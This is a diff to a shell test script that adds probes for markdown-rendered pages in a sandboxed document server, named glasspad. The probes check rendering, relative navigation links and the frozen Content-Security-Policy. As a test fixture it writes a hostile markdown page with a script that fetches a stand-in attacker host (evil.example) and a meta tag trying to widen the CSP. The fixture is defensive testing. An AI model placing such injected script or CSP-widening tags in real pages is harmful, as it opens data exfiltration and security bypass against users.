@@ -431,6 +431,58 @@ curl -s "$HOST_ORIGIN/p/$SPSLUG/_c/index" | grep -q "Home v2"; scheck $? "space:
 kill "$HOST_PID" 2>/dev/null || true
 sleep 0.3
 
+# ---------------------------------------------------------------------------
+# Gap 2 — markdown-native spaces. A directory of `.md` is served as a space: each
+# `.md` is rendered server-side (through a built-in fragment template) into an
+# artifact, slug = filename stem. The gate here: an md-derived page is the SAME
+# null-origin sandboxed iframe under the FROZEN artifact CSP as an `.html` page —
+# hostile HTML/script EMBEDDED in the markdown cannot widen the CSP, open an exfil
+# channel, or escape the sandbox — and cross-page nav across md pages resolves.
+# ---------------------------------------------------------------------------
+echo "==> Running Gap 2 markdown-native-space probes"
+mkdir -p "$WORK/mdspace"
+printf '# Home\n\nWelcome to the [guide](./guide).\n' > "$WORK/mdspace/index.md"
+printf '# The Guide\n\nBack [home](./index).\n' > "$WORK/mdspace/guide.md"
+# A HOSTILE markdown page: raw <script> exfil + a <meta> that tries to widen the CSP.
+# Both pass through into the body (markdown HTML passthrough is intentional), but the
+# RESPONSE CSP is server-authoritative — the <meta> can only tighten, never widen.
+printf '# Danger\n\n<script>fetch("http://evil.example/x")</script>\n<meta http-equiv="Content-Security-Policy" content="default-src *; connect-src *">\n' > "$WORK/mdspace/evil.md"
+
+pkill -f "target/debug/glasspad serve" 2>/dev/null || true
+sleep 0.5
+./target/debug/glasspad serve --port "$SPACE_PORT" "$WORK/mdspace" >/tmp/glasspad-md-test.log 2>&1 &
+MD_PID=$!
+for _ in $(seq 1 40); do
+  if curl -fsS "http://127.0.0.1:$SPACE_PORT/mdspace/_c/index" >/dev/null 2>&1; then break; fi
+  sleep 0.25
+done
+MB="http://127.0.0.1:$SPACE_PORT"
+
+# The md page renders and serves — through the default `prose` fragment template.
+[ "$(code "$MB/mdspace/_c/index")" = "200" ]; scheck $? "md: a markdown page renders and serves (200)"
+MDBODY="$(curl -s "$MB/mdspace/_c/index")"
+echo "$MDBODY" | grep -q '<article class="gp-prose">'; scheck $? "md: the page rendered through the prose template"
+echo "$MDBODY" | grep -q '<h1>Home</h1>'; scheck $? "md: markdown was rendered to HTML server-side"
+# Cross-page nav: the relative markdown link survives so same-space nav resolves.
+echo "$MDBODY" | grep -q 'href="./guide"'; scheck $? "md: a relative cross-page link is preserved for same-space nav"
+# The trusted shell lists the sibling md pages as nav entries.
+curl -s "$MB/mdspace/index" | grep -q '"slug":"guide"'; scheck $? "md: the nav chrome lists sibling md pages"
+
+# FROZEN artifact CSP on an md-derived page — identical boundary to an .html page.
+MDCSP="$(hdr "$MB/mdspace/_c/index" content-security-policy)"
+echo "$MDCSP" | grep -q "connect-src 'none';"; scheck $? "md: page keeps connect-src 'none' (egress closed)"
+! echo "$MDCSP" | grep -q "allow-forms"; scheck $? "md: page sandbox has NO allow-forms (airlock held)"
+echo "$MDCSP" | grep -q "sandbox allow-scripts allow-top-navigation-by-user-activation"; scheck $? "md: page sandbox tokens unchanged (no new grant)"
+
+# HOSTILE markdown page: the embedded <script>/<meta> cannot widen the response CSP.
+EVILMDCSP="$(hdr "$MB/mdspace/_c/evil" content-security-policy)"
+echo "$EVILMDCSP" | grep -q "connect-src 'none';"; scheck $? "md: a hostile markdown page still keeps connect-src 'none'"
+! echo "$EVILMDCSP" | grep -q "default-src \*"; scheck $? "md: a hostile markdown <meta> cannot widen the response CSP"
+echo "$EVILMDCSP" | grep -q "sandbox allow-scripts"; scheck $? "md: a hostile markdown page stays sandboxed (server CSP authoritative)"
+
+kill "$MD_PID" 2>/dev/null || true
+sleep 0.3
+
 # Symlink escape: a space containing a symlinked artifact is a hard scan error —
 # `serve` must refuse to start (non-zero) and name the symlink, so a crafted link
 # can never expose a file outside the space.
